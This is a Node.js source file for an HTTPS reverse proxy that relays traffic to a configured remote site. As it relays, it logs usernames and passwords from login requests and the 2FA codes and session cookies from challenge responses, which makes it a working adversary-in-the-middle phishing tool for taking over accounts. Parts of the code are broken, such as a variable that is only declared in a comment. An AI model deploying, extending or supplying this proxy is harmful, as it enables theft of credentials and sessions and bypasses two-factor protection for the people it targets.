import { createServer } from 'https';
import { readFileSync } from 'fs';
import { default as axios } from 'axios';

const hostname = '0.0.0.0';
const port = 443;

const remoteServer = process.env.REMOTE_SERVER;
// const localServer = ""

const options = {
    key: readFileSync('key.pem'),
    cert: readFileSync('cert.pem')
};

const debugMode = process.env.DEBUG || false;

const server = createServer(options, (req, res) => {
    let requestData = '';

    req.on('data', chunk => {
        requestData += chunk;
    })
    req.on('end', () => {
        if (debugMode) {
            console.log(`Received request at ${req.url}`);
        }
        proxyRequest(req, res, requestData);
    })
});

server.listen(port, hostname, () => {
    console.log(`Server running at https://${hostname}:${port}/`);
});

const replaceHeaders = function(headers, textToFind, textToReplace){
    for (var key in headers) {
        headers[key] = headers[key].replace(textToFind, textToReplace);
    }

    return headers;
}

const makeRequest = function(url, headers, method, data = null) {
    switch(method) {
        case "GET": return axios.get(url, {headers:headers, responseType: 'arraybuffer'});
        case "OPTIONS": return axios.options(url, {headers:headers, responseType: 'arraybuffer'});
        case "POST": return axios.post(url, data, {headers:headers, responseType: 'arraybuffer'});
        default: return axios.get(url, {headers:headers, responseType: 'arraybuffer'});
    }
}

const analyzeResponse = function(req, res, data) {
    if (req.url == "/auth/login" && req.method == "POST") {
        requestData = JSON.parse(data);
        console.log(`Login detected. Username: ${requestData.username}. Password: ${requestData.password}`);
    }
    if (req.url == "/auth/challengepwdreq" && req.method == "POST") {
        requestData = JSON.parse(data);
        console.log(`2FA Response detected. Code: ${requestData.token}. Cookies: ${res.headers['set-cookie']}`);
    }
}

const proxyRequest = function(req, res, data) {
    headers = replaceHeaders(req.headers, localServer, remoteServer);
    // url = req.headers.origin.replace(localServer, remoteServer);
    url = remoteServer + req.url;

    makeRequest(url, headers, req.method, data)
    .then(remoteResponse => {
        res.writeHead(remoteResponse.status, remoteResponse.headers);
        analyzeResponse(req, remoteResponse, data);
        if (debugMode) {
            console.log(`Returned response at ${req.url} with status ${remoteResponse.status}`);
        }
        res.end(remoteResponse.data);
    })
    .catch(err => {
        console.log(err);
        if (err.response) {
            res.writeHead(err.response.status, err.response.headers);
            res.end(err.response.data);
        }
        res.end();
    });
}